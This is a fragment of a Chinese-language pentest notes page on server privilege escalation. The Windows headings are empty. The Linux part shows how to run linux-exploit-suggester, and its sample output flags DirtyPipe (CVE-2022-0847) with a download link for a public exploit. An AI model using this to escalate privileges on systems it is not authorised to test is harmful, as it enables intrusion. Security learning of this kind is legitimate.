+<h1 id="三、服务器系统"><a href="#三、服务器系统" class="headerlink" title="三、服务器系统"></a>三、服务器系统</h1><h3 id="一-Windows"><a href="#一-Windows" class="headerlink" title="(一)Windows"></a>(一)Windows</h3><h4 id="1、针对环境"><a href="#1、针对环境" class="headerlink" title="1、针对环境"></a>1、针对环境</h4><h4 id="2、提权方法"><a href="#2、提权方法" class="headerlink" title="2、提权方法"></a>2、提权方法</h4><h4 id="3、针对版本"><a href="#3、针对版本" class="headerlink" title="3、针对版本"></a>3、针对版本</h4><h3 id="二-Linux"><a href="#二-Linux" class="headerlink" title="(二)Linux"></a>(二)Linux</h3><h4 id="1、辅助工具Linux-exploit-suggester"><a href="#1、辅助工具Linux-exploit-suggester" class="headerlink" title="1、辅助工具Linux_exploit_suggester"></a>1、辅助工具Linux_exploit_suggester</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux-exploit-suggester.sh<br></code></pre></td></tr></table></figure>
+
+<p>返回结果</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">[<span class="hljs-operator">+</span>] [CVE-<span class="hljs-number">202</span>2-<span class="hljs-number">0847</span>] DirtyPipe<br><br>   <span class="hljs-params">Details:</span> https:<span class="hljs-operator">//</span>dirtypipe.cm4all.com<span class="hljs-symbol">/</span>				(漏洞介绍)<br>   <span class="hljs-params">Exposure:</span> probable<br>   <span class="hljs-params">Tags:</span> [ ubuntu<span class="hljs-operator">=</span>(<span class="hljs-number">20.04</span>|<span class="hljs-number">21.04</span>) ],debian<span class="hljs-operator">=</span><span class="hljs-number">11</span><br>   Download <span class="hljs-params">URL:</span> https:<span class="hljs-symbol">//haxx.in/files/dirtypipez.c</span>		(EXP下载地址)<br></code></pre></td></tr></table></figure></li>
+</ul>
 
                 
               </div>
